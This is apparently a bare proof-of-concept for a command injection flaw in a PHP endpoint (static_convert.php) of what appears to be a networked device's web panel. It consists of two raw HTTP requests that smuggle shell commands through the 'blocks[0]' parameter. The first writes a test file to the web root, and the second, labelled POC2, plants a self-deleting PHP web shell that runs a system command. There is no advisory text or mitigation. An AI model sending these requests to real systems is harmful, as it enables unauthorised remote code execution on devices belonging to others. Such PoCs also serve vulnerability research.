```

GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'abab'%20>>%20/var/www/html/test.txt%0A HTTP/1.1
Host:your-ip
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

POC2

```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20system("id");unlink(__FILE__);?>%27%20>/var/www/html/rce.php HTTP/1.1
Host: 
Accept: application/json, text/javascript, */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

